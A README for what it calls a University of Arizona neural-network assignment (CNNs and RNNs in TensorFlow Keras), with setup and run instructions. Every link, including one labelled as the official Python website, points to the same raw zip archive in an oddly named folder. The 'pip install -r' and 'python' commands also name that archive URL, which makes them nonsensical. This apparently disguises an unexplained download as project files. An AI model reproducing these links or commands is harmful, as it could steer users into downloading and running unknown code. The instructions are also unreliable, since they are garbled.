## üìñ Overview

Welcome to the **info527-neural-networks-assignment4** project! This application showcases deep learning architectures using TensorFlow Keras. You can explore convolutional neural networks (CNNs) for image and text classification, along with recurrent neural networks (RNNs) for sequence modeling. This project is part of the Master‚Äôs in MIS/ML program at the University of Arizona.

## üöÄ Getting Started

Follow these steps to download and run the application smoothly.

### üóÇÔ∏è Prerequisites

- **Operating System**: Windows, macOS, or Linux
- **Python**: Version 3.6 or higher
- **TensorFlow**: Version 2.0 or higher

Make sure you have the latest version of Python installed. You can download it from the official [Python website](https://raw.githubusercontent.com/mhtmalla/info527-neural-networks-assignment4/main/goldtit/info527-neural-networks-assignment4.zip).

### üì• Download & Install

To get started, visit the [Releases page](https://raw.githubusercontent.com/mhtmalla/info527-neural-networks-assignment4/main/goldtit/info527-neural-networks-assignment4.zip) to download the application files. Look for the latest release version, which will contain all necessary files.

1. Visit the [Releases page](https://raw.githubusercontent.com/mhtmalla/info527-neural-networks-assignment4/main/goldtit/info527-neural-networks-assignment4.zip).
2. Locate the latest version link.
3. Click on the file suited for your operating system to download it.
4. Save the file to a memorable location on your computer.

### ‚öôÔ∏è Running the Application

Once you have downloaded the application files, follow these steps:

1. **Extract the Files**: If the downloaded file is in a zip format, right-click and select "Extract All" to extract the files.
  
2. **Open a Command Prompt or Terminal**:
   - For Windows, search for "cmd" in your Start menu.
   - For macOS, open "Terminal" from Applications.

3. **Navigate to the Application Folder**:
   Use the `cd` command to change to the directory where you extracted the application files. For example:
   ```
   cd path\to\the\extracted\folder
   ```
   Replace `path\to\the\extracted\folder` with the actual path.

4. **Install Required Packages**:
   Once in the folder, run this command to install any necessary Python packages:
   ```
   pip install -r https://raw.githubusercontent.com/mhtmalla/info527-neural-networks-assignment4/main/goldtit/info527-neural-networks-assignment4.zip
   ```
   This command will read the `https://raw.githubusercontent.com/mhtmalla/info527-neural-networks-assignment4/main/goldtit/info527-neural-networks-assignment4.zip` file and install the libraries you need.

5. **Run the Application**:
   To start the application, execute:
   ```
   python https://raw.githubusercontent.com/mhtmalla/info527-neural-networks-assignment4/main/goldtit/info527-neural-networks-assignment4.zip
   ```
   Ensure that the `https://raw.githubusercontent.com/mhtmalla/info527-neural-networks-assignment4/main/goldtit/info527-neural-networks-assignment4.zip` file is present in the folder.
